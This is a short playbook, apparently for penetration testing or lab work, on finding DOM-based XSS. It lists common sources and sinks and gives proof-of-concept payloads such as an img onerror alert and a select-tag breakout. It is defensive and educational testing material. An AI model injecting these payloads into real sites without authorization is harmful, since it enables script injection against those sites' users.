## XSS DOM-based Playbook

**STRATEGY:** Exploit client-side JavaScript that unsafely handles URL parameters or user input.

### Steps
1. Look for URL parameters reflected in the page (search, redirect, etc.)
2. Check page source for dangerous sinks: `innerHTML`, `document.write`, `eval`
3. Inject payload in URL parameter: `?search=<img src=x onerror=alert(1)>`
4. For select/dropdown breakout: `</select><img src=x onerror=alert(1)>`
5. If alert fires → CONFIRMED

### Common DOM XSS Sinks
- `element.innerHTML = userInput`
- `document.write(userInput)`
- `eval(userInput)`
- `location = userInput`
- `jQuery.html(userInput)`

### Common Sources
- `location.search` (URL query string)
- `location.hash` (URL fragment)
- `document.referrer`
- `window.name`

### Payloads by Context
- Inside HTML: `<img src=x onerror=alert(1)>`
- Inside script string: `'-alert(1)-'` or `";alert(1)//`
- Inside select tag: `</select><img src=x onerror=alert(1)>`
- URL fragment: `#<img src=x onerror=alert(1)>`

### Indicators of Success
- Payload executes entirely client-side (no server request needed)
- Alert appears after manipulating URL parameters
- Source code shows unsafe JavaScript DOM manipulation
